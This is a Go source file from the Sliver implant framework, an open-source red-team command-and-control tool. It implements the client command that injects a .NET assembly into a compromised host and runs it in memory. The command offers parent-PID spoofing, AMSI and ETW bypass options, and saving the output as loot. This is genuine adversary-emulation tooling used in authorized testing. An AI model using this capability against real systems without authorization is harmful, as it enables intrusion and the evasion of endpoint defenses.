package exec

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"os"
	"path/filepath"
	"strings"

	"github.com/AlecAivazis/survey/v2"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/spf13/cobra"
	"google.golang.org/protobuf/proto"
)

// ExecuteAssemblyCmd - Execute a .NET assembly in-memory.
func ExecuteAssemblyCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	arch, _ := cmd.Flags().GetString("arch")
	method, _ := cmd.Flags().GetString("method")
	className, _ := cmd.Flags().GetString("class")
	appDomain, _ := cmd.Flags().GetString("app-domain")
	pPid, _ := cmd.Flags().GetUint32("ppid")

	assemblyPath := args[0]
	isDLL := false
	if filepath.Ext(assemblyPath) == ".dll" {
		isDLL = true
	}
	if isDLL {
		if className == "" || method == "" {
			con.PrintErrorf("Please provide a class name (namespace.class) and method\n")
			return
		}
	}
	assemblyBytes, err := os.ReadFile(assemblyPath)
	if err != nil {
		con.PrintErrorf("%s", err.Error())
		return
	}

	assemblyArgs := args[1:]
	process, _ := cmd.Flags().GetString("process")
	processArgsStr, _ := cmd.Flags().GetString("process-arguments")
	processArgs := strings.Split(processArgsStr, " ")
	inProcess, _ := cmd.Flags().GetBool("in-process")

	runtime, _ := cmd.Flags().GetString("runtime")
	etwBypass, _ := cmd.Flags().GetBool("etw-bypass")
	amsiBypass, _ := cmd.Flags().GetBool("amsi-bypass")

	if !inProcess && (runtime != "" || etwBypass || amsiBypass) {
		con.PrintErrorf("The --runtime, --etw-bypass, and --amsi-bypass flags can only be used with the --in-process flag\n")
		return
	}

	assemblyArgsStr := strings.Join(assemblyArgs, " ")
	assemblyArgsStr = strings.TrimSpace(assemblyArgsStr)
	if len(assemblyArgsStr) > 256 && !inProcess {
		con.PrintWarnf(" Injected .NET assembly arguments are limited to 256 characters when using the default fork/exec model.\nConsider using the --in-process flag to execute the .NET assembly in-process and work around this limitation.\n")
		confirm := false
		prompt := &survey.Confirm{Message: "Do you want to continue?"}
		survey.AskOne(prompt, &confirm, nil)
		if !confirm {
			return
		}
	}

	ctrl := make(chan bool)
	con.SpinUntil("Executing assembly ...", ctrl)
	execAssembly, err := con.Rpc.ExecuteAssembly(context.Background(), &sliverpb.ExecuteAssemblyReq{
		Request:     con.ActiveTarget.Request(cmd),
		IsDLL:       isDLL,
		Process:     process,
		Arguments:   assemblyArgs,
		Assembly:    assemblyBytes,
		Arch:        arch,
		Method:      method,
		ClassName:   className,
		AppDomain:   appDomain,
		ProcessArgs: processArgs,
		PPid:        pPid,
		Runtime:     runtime,
		EtwBypass:   etwBypass,
		AmsiBypass:  amsiBypass,
		InProcess:   inProcess,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s", err)
		return
	}
	hostName := getHostname(session, beacon)
	if execAssembly.Response != nil && execAssembly.Response.Async {
		con.AddBeaconCallback(execAssembly.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, execAssembly)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}

			HandleExecuteAssemblyResponse(execAssembly, assemblyPath, hostName, cmd, con)
		})
		con.PrintAsyncResponse(execAssembly.Response)
	} else {
		HandleExecuteAssemblyResponse(execAssembly, assemblyPath, hostName, cmd, con)
	}
}

func HandleExecuteAssemblyResponse(execAssembly *sliverpb.ExecuteAssembly, assemblyPath string, hostName string, cmd *cobra.Command, con *console.SliverClient) {
	saveLoot, _ := cmd.Flags().GetBool("loot")
	lootName, _ := cmd.Flags().GetString("name")

	if execAssembly.GetResponse().GetErr() != "" {
		con.PrintErrorf("Error: %s\n", execAssembly.GetResponse().GetErr())
		return
	}

	save, _ := cmd.Flags().GetBool("save")

	PrintExecutionOutput(string(execAssembly.GetOutput()), save, cmd.Name(), hostName, con)

	if saveLoot {
		LootExecute(execAssembly.GetOutput(), lootName, cmd.Name(), assemblyPath, hostName, con)
	}
}
